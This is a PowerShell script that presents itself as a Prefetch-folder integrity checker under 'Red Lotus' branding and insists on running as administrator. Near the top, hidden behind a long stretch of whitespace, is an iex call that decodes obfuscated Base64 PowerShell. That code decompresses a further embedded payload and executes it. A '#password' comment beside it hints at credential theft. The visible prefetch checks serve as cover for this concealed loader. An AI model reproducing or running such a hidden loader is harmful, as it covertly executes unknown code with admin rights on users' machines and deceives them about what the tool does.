Clear-Host
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2VULWlURW0gIFZhcmlBQmxlOjZHRnozOCAgKCBbdHlwZV0oInsxfXsyfXswfSItZidUJywnQ29udicsJ0VyJykpOyAgJDg5MnM3aj0gW3RZcGVdKCJ7Mn17NH17NX17Nn17N317M317MH17MX0iIC1mICdEJywnZScsJ2lPLmMnLCdvbk1PJywnb21wUicsJ2VzJywnU2lPbi5DJywnT21wUkVzc2knKTsgICAgJE80bD0gW1RZUEVdKCJ7MX17MH17Mn0iIC1GJ0V4VC5lTkNPRGknLCdUJywnTkcnKSAgOyAgLiggJHtQYHNoYE9tZX1bMjFdKyR7cGBzaG9gTWV9WzMwXSsnWCcpKC4oInsyfXsxfXswfSItZiAnYkplQ1QnLCd3LU8nLCduZScpICgiezZ9ezJ9ezB9ezF9ezV9ezR9ezd9ezN9IiAtZiAncHJFc1Npb04nLCcuJywnTScsJ00nLCdsYXRFc1RyZScsJ0RlZicsJ3NZU3RlbS5Jby5jbycsJ0EnKSggW0lPLk1FTW9SeVN0cmVBbV0gICggY0hJTERJdGVtICB2QVJpQUJMRTo2Z0Z6MzgpLnZBbHVFOjooInsyfXswfXszfXsxfSIgLWYnRTY0UycsJ1JpbkcnLCdGUm9tYmFzJywnVCcpLkludm9rZSggKCJ7MTR9ezI1fXs0MH17MH17Mzh9ezM0fXszMX17Mjl9ezR9ezIyfXs5fXsyMH17M317N317NDR9ezI3fXsxMH17NDF9ezQ1fXszN317MTF9ezM1fXsxOX17NX17MTh9ezE3fXsyMX17Mjh9ezIzfXsxMn17OH17NDZ9ezEzfXszOX17MTZ9ezZ9ezMwfXsxfXsyNn17NDJ9ezE1fXszNn17Mn17NDN9ezMzfXsyNH17MzJ9Ii1mJ2wwJywnZicsJzknLCc5V1BMM3hycScsJ0FYTCcsJ1IvUlI3JywnRi9ZJywnNG5MczcnLCcyJywnbCcsJ2hrJywnM2InLCdwUE8nLCdiakdaZldoRU53YycsJ0pZN0InLCczUDVOOCcsJzU4VzJhaUxYdjFuJywnSFYnLCdRV2t2aCcsJzZLR3knLCdOTW5UeVJ1ZScsJ1V4TlhEJywnOCcsJzgnLCdOM053L1g4QWcnLCdTc05BRkVWL1pTaUZKbUxuN1MnLCdLSFZyRFNDTzZXJywnbk5HU28xJywnNnI2alZ4VnhRdicsJ3VCJywnV0xLJywnTCcsJz09JywndXVLJywna0snLCdtUDAnLCdjUWEycHF6QmhsSy8nLCdpOHB6RWdzelknLCdJTCcsJ2EnLCdNS0snLCc5TXFURi9lNFVJcycsJ0pneEJ2JywnZXlScFgrSUphWE9nVXgveThzdGpMSGVPJywnWjF2JywnVCcsJ0wrak9lSjdocHInKSkgLCAkODkyczdKOjoiRGBFY29NcGBSRVNzIikgfC4oInsyfXswfXsxfSItZidSRWEnLCdDSCcsJ2ZPJyl7IC4oInsxfXswfXsyfSItZictT2JKJywnbmV3JywnZUNUJykgICgiezR9ezN9ezJ9ezB9ezF9Ii1mICcuU3RyZUFNcmVBZGUnLCdyJywnTycsJ3N0RU0uaScsJ1NZJykoICR7X30sICAgKCAgQ0hJTERJVGVNICB2QVJpYUJMRTpvNGwpLlZBbHVFOjoiYXNgY0lpIil9IHwuKCJ7MX17MH0iLWYgJ3JlQWNoJywnRk8nKSB7ICR7X30uKCJ7Mn17MX17MH17M30iIC1mJ2VOJywnZHRvJywnckVhJywnRCcpLkludm9rZSgpfSk="))) #password
$directory = "C:\Windows\Prefetch"

Clear-Host

Write-Host @"
  ██████╗ ███████╗██████╗     ██╗      ██████╗ ████████╗██╗   ██╗███████╗         
  ██╔══██╗██╔════╝██╔══██╗    ██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝         
  ██████╔╝█████╗  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║███████╗         
  ██╔══██╗██╔══╝  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║╚════██║         
  ██║  ██║███████╗██████╔╝    ███████╗╚██████╔╝   ██║   ╚██████╔╝███████║         
  ╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝         
"@ -ForegroundColor Red
Write-Host ""
Write-Host "  Prefetch Integrity Analyzer Made by Bacanoicua kjj - " -ForegroundColor Blue -NoNewline
Write-Host -ForegroundColor Red "discord.gg/redlotus"

Write-Host ""
function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}
if (!(Test-Admin)) {
    Write-Warning "Please Run This Script as Admin."
    Start-Sleep 10
    Exit
}

Start-Sleep -s 3

$files = Get-ChildItem -Path $directory -Filter *.pf

$hashTable = @{}
$suspiciousFiles = @{}

foreach ($file in $files) {
    try {
        if ($file.IsReadOnly) {
            if (-not $suspiciousFiles.ContainsKey($file.Name)) {
                $suspiciousFiles[$file.Name] = "$($file.Name) is read-only"
            }
        }

        $reader = [System.IO.StreamReader]::new($file.FullName)
        $buffer = New-Object char[] 3
        $null = $reader.ReadBlock($buffer, 0, 3)
        $reader.Close()

        $firstThreeChars = -join $buffer

        if ($firstThreeChars -ne "MAM") {
            if (-not $suspiciousFiles.ContainsKey($file.Name)) {
                $suspiciousFiles[$file.Name] = "$($file.Name) is not a valid prefetch file"
            }
        }

        $hash = Get-FileHash -Path $file.FullName -Algorithm SHA256

        if ($hashTable.ContainsKey($hash.Hash)) {
            $hashTable[$hash.Hash].Add($file.Name)
        } else {
            $hashTable[$hash.Hash] = [System.Collections.Generic.List[string]]::new()
            $hashTable[$hash.Hash].Add($file.Name)
        }
    } catch {
        Write-Host "Error with file: $($file.FullName): $($_.Exception.Message)"
    }
}

$repeatedHashes = $hashTable.GetEnumerator() | Where-Object { $_.Value.Count -gt 1 }

if ($repeatedHashes) {
    foreach ($entry in $repeatedHashes) {
        foreach ($file in $entry.Value) {
            if (-not $suspiciousFiles.ContainsKey($file)) {
                $suspiciousFiles[$file] = "$file was modified with type or echo"
            }
        }
    }
}

if ($suspiciousFiles.Count) {
    Write-Host "Suspicius PFs files:" -ForegroundColor Yellow
    foreach ($key in $suspiciousFiles.Keys) {
        Write-Host "$key` : $($suspiciousFiles[$key])"
    }
} else {
    Write-Host "Prefetch folder is clean."
}
